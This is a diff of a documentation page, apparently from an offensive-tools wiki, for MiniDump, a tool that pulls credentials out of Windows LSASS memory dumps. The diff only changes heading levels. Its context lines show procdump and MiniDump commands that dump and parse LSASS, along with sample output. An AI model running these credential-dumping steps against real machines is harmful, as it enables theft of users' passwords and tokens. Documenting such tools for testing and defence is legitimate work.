@@ -25,11 +25,11 @@ Supported Credentials:
 * Dpapi
 * CloudAP
 
-### Installation
+## Installation
 
 {{%attachments title="Related files" fa_icon_class="far fa-file" pattern=".*(exe)"/%}}
 
-### Usage
+## Usage
 
 [Sysinternals - procdump]({{< ref "sysinternals" >}})
 
@@ -38,7 +38,7 @@ PS C:\> .\procdump64.exe (ps lsass).id data -ma
 PS C:\> MiniDump.exe lsass.dmp
 ```
 
-### Examples
+## Examples
 
 ```plain
 PS C:\Users\johndo\Downloads> .\MiniDump.exe C:\temp\lsass.DMP
@@ -83,6 +83,6 @@ Dpapi failed: Object reference not set to an instance of an object.
 [...]
 ```
 
-### URL list
+## URL List
 
 * [Github.com - Minidump](https://github.com/cube0x0/MiniDump)
